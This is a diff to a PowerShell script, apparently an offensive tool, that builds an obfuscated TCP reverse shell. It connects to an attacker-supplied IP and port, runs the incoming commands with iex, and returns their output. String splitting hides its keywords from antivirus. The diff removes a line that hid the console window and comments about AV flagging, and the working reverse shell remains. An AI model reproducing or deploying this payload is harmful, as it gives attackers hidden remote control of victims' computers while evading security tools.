@@ -1,10 +1,7 @@
 param([string]$ip,[string]$port)
 
-#optionally you may have to remove line 7 to avoid AV flagging, but it isn't being flagged at the moment.
-#if you do remove line 7 you can just paste it in or have it auto run on the attacker box to hide the window also
-#hide window line 7, reverse shell line 8
+#reverse shell
 $code=@'
-Add-Type -name y -names x -m '[DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr a, Int32 b);';[x.y]::ShowWindow([x.y]::GetConsoleWindow(), 0)
 $x=(New-Object net.sock''ets.tcpc''lient("~",^)).('gets'+'tream')();[byte[]]$b=0..65535|%{0};while(($i=$x.('rea'+'d')($b,0,$b.Length))-ne 0){$d=([text.encoding]::getencoding(20127)).('getb'+'ytes')(((i''ex((New-Object -t text.('asciie'+'ncoding')).('gets'+'tring')($b,0,$i))2>&1|out-string)+(pwd).path+"> "));$x.write($d,0,$d.Length);$x.flush()}
 '@ -replace '~',$ip -replace '\^',$port
 
